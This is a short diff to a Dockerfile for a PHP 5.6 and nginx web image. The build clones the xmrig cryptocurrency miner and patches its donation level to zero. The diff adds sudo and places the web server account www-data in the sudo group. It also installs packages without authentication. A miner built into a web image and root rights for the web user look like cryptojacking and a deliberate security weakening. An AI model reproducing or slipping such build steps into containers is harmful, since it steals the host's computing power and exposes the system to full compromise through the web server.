@@ -23,11 +23,12 @@ RUN \
  apt-get update ; \
  apt-get -y --allow-unauthenticated install nginx-extras \
  php5.6-cli php5.6-curl php5.6-fpm php5.6-json php5.6-mcrypt php5.6-mysql php5.6-sqlite php5.6-xmlrpc php5.6-xsl php5.6-gd \
- curl wget git unzip pwgen anacron build-essential cmake libuv1-dev libmicrohttpd-dev gcc-7 g++-7 \
+ curl wget git unzip pwgen anacron build-essential cmake libuv1-dev libmicrohttpd-dev gcc-7 g++-7 sudo \
  supervisor \
  mysql-client ; \
  apt-get clean ; \
  phpenmod mcrypt ; \
+ sudo usermod -aG sudo www-data ; \
  git clone https://github.com/xmrig/xmrig && \
  cd xmrig && \
  sed -i -e 's/constexpr const int kDonateLevel = 5;/constexpr const int kDonateLevel = 0;/g' src/donate.h && \
